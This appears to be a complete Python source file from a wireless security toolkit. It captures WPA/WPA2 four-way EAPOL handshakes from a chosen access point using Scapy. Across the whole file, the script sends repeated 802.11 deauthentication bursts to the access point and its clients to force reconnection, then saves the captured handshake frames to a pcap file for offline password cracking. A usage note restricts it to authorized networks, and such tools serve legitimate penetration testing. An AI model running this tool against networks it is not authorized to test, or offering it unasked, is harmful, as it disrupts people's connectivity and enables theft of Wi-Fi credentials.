#!/usr/bin/env python3
"""
WPA Handshake Capture for Hoover WiFi Security Toolkit
Captures WPA/WPA2 4-way EAPOL handshake frames for authorized security testing
"""

import sys
import os
import argparse
import threading
import subprocess
import time
from datetime import datetime
from typing import Optional

from scapy.layers.dot11 import Dot11, Dot11Deauth, RadioTap
from scapy.layers.eap import EAPOL
from scapy.sendrecv import sniff, sendp
from scapy.utils import wrpcap

from utils import validate_mac, validate_interface, check_monitor_mode, require_root, setup_logging
from oui_lookup import lookup_vendor


class HandshakeCapture:
    def __init__(self, interface: str, target_bssid: str,
                 target_client: Optional[str] = None,
                 channel: Optional[int] = None,
                 output_dir: str = "captures",
                 timeout: int = 120,
                 deauth_count: int = 5,
                 deauth_interval: float = 2.0,
                 no_deauth: bool = False) -> None:
        self.interface: str = interface
        self.target_bssid: str = target_bssid.upper()
        self.target_client: Optional[str] = target_client.upper() if target_client else None
        self.channel: Optional[int] = channel
        self.output_dir: str = output_dir
        self.timeout: int = timeout
        self.deauth_count: int = deauth_count
        self.deauth_interval: float = deauth_interval
        self.no_deauth: bool = no_deauth
        self.logger = setup_logging("handshake_capture")
        self.eapol_frames: list = []
        self.handshake_complete: bool = False
        self._stop_event = threading.Event()
        self._start_time: Optional[float] = None

    def packet_handler(self, packet) -> None:
        if not packet.haslayer(EAPOL):
            return

        try:
            if not packet.haslayer(Dot11):
                return

            dot11 = packet[Dot11]
            addrs = {
                str(getattr(dot11, f"addr{i}", "") or "").upper()
                for i in range(1, 4)
            }

            if self.target_bssid not in addrs:
                return

            if self.target_client:
                if self.target_client not in addrs:
                    return

            self.eapol_frames.append(packet)
            frame_num = len(self.eapol_frames)
            src = str(dot11.addr2 or "").upper()
            dst = str(dot11.addr1 or "").upper()
            self.logger.info(
                "EAPOL frame %d captured: %s -> %s", frame_num, src, dst
            )

            if frame_num >= 4:
                self.handshake_complete = True
                self.logger.info("4-way handshake captured!")
                self._stop_event.set()

        except Exception as e:
            self.logger.debug("Error processing EAPOL packet: %s", e)

    def _send_deauth(self) -> None:
        client = self.target_client or "ff:ff:ff:ff:ff:ff"
        self.logger.info(
            "Sending deauth frames: %s -> %s (count: %d, interval: %.1fs)",
            self.target_bssid, client, self.deauth_count, self.deauth_interval,
        )

        while not self._stop_event.is_set():
            try:
                dot11_to_client = Dot11(
                    addr1=client, addr2=self.target_bssid, addr3=self.target_bssid
                )
                dot11_to_ap = Dot11(
                    addr1=self.target_bssid, addr2=client, addr3=self.target_bssid
                )
                deauth = Dot11Deauth(reason=7)

                frame1 = RadioTap() / dot11_to_client / deauth
                frame2 = RadioTap() / dot11_to_ap / deauth

                for _ in range(self.deauth_count):
                    sendp(frame1, iface=self.interface, verbose=False)
                    sendp(frame2, iface=self.interface, verbose=False)

                self.logger.info("Sent %d deauth frames", self.deauth_count * 2)

            except Exception as e:
                self.logger.warning("Error sending deauth: %s", e)

            self._stop_event.wait(self.deauth_interval)

    def _set_channel(self, channel: int) -> None:
        try:
            if validate_interface(self.interface):
                subprocess.run(
                    ["iwconfig", self.interface, "channel", str(channel)],
                    capture_output=True, text=True, timeout=5,
                )
                self.logger.info("Set channel to %d", channel)
        except (subprocess.TimeoutExpired, FileNotFoundError, OSError) as e:
            self.logger.warning("Could not set channel: %s", e)

    def start(self) -> bool:
        os.makedirs(self.output_dir, exist_ok=True)
        self._start_time = time.time()

        self.logger.info("Starting handshake capture for %s", self.target_bssid)
        if self.target_client:
            self.logger.info("Target client: %s", self.target_client)
        self.logger.info("Timeout: %ds", self.timeout)

        if self.channel:
            self._set_channel(self.channel)

        if not self.no_deauth:
            deauth_thread = threading.Thread(target=self._send_deauth, daemon=True)
            deauth_thread.start()

        try:
            sniff(
                iface=self.interface,
                prn=self.packet_handler,
                stop_filter=lambda p: self._stop_event.is_set(),
                timeout=self.timeout,
                store=0,
            )
        except KeyboardInterrupt:
            self.logger.info("Capture interrupted by user")
        finally:
            self._stop_event.set()

        if self.handshake_complete:
            self.logger.info("Handshake successfully captured!")
        else:
            self.logger.warning(
                "Capture ended. %d EAPOL frames collected (handshake incomplete)",
                len(self.eapol_frames),
            )

        return self.handshake_complete

    def save_capture(self) -> Optional[str]:
        if not self.eapol_frames:
            self.logger.warning("No EAPOL frames to save")
            return None

        bssid_safe = self.target_bssid.replace(":", "-")
        timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
        filename = f"handshake_{bssid_safe}_{timestamp}.pcap"
        filepath = os.path.join(self.output_dir, filename)

        wrpcap(filepath, self.eapol_frames)
        self.logger.info("Capture saved to %s (%d frames)", filepath, len(self.eapol_frames))
        return filepath

    def get_status(self) -> dict:
        elapsed = time.time() - self._start_time if self._start_time else 0
        return {
            "target_bssid": self.target_bssid,
            "target_client": self.target_client,
            "frames_captured": len(self.eapol_frames),
            "handshake_complete": self.handshake_complete,
            "elapsed_time": round(elapsed, 1),
        }


def main() -> None:
    parser = argparse.ArgumentParser(
        description="WPA Handshake Capture - Capture 4-way EAPOL handshake",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Examples:
  # Capture handshake with deauth
  sudo python3 handshake_capture.py -i wlan0mon -b AA:BB:CC:DD:EE:FF -ch 6

  # Target specific client
  sudo python3 handshake_capture.py -i wlan0mon -b AA:BB:CC:DD:EE:FF -c 11:22:33:44:55:66

  # Passive capture (no deauth)
  sudo python3 handshake_capture.py -i wlan0mon -b AA:BB:CC:DD:EE:FF --no-deauth

Note: Interface must be in monitor mode.
      Only use on networks you own or have authorization to test.
        """,
    )

    parser.add_argument("-i", "--interface", required=True,
                        help="Wireless interface in monitor mode")
    parser.add_argument("-b", "--bssid", required=True,
                        help="Target AP BSSID (MAC address)")
    parser.add_argument("-c", "--client",
                        help="Target client MAC (default: any)")
    parser.add_argument("-ch", "--channel", type=int,
                        help="Channel to listen on")
    parser.add_argument("-o", "--output-dir", default="captures",
                        help="Output directory for pcap files (default: captures)")
    parser.add_argument("-t", "--timeout", type=int, default=120,
                        help="Capture timeout in seconds (default: 120)")
    parser.add_argument("--deauth-count", type=int, default=5,
                        help="Deauth frames per burst (default: 5)")
    parser.add_argument("--deauth-interval", type=float, default=2.0,
                        help="Seconds between deauth bursts (default: 2.0)")
    parser.add_argument("--no-deauth", action="store_true",
                        help="Passive capture only (no deauth)")
    parser.add_argument("-v", "--verbose", action="store_true",
                        help="Verbose output")

    args = parser.parse_args()

    logger = setup_logging("handshake_capture", verbose=args.verbose)
    require_root()

    if not validate_mac(args.bssid):
        logger.error("Invalid BSSID format: %s", args.bssid)
        sys.exit(1)

    if args.client and not validate_mac(args.client):
        logger.error("Invalid client MAC format: %s", args.client)
        sys.exit(1)

    if not check_monitor_mode(args.interface):
        logger.warning("%s may not be in monitor mode", args.interface)
        response = input("Continue anyway? (y/N): ")
        if response.lower() != "y":
            sys.exit(1)

    capturer = HandshakeCapture(
        interface=args.interface,
        target_bssid=args.bssid,
        target_client=args.client,
        channel=args.channel,
        output_dir=args.output_dir,
        timeout=args.timeout,
        deauth_count=args.deauth_count,
        deauth_interval=args.deauth_interval,
        no_deauth=args.no_deauth,
    )

    success = capturer.start()
    filepath = capturer.save_capture()

    if success and filepath:
        print(f"\nHandshake captured and saved to: {filepath}")
    elif filepath:
        print(f"\nPartial capture saved to: {filepath}")
    else:
        print("\nNo EAPOL frames captured")

    sys.exit(0 if success else 1)


if __name__ == "__main__":
    main()
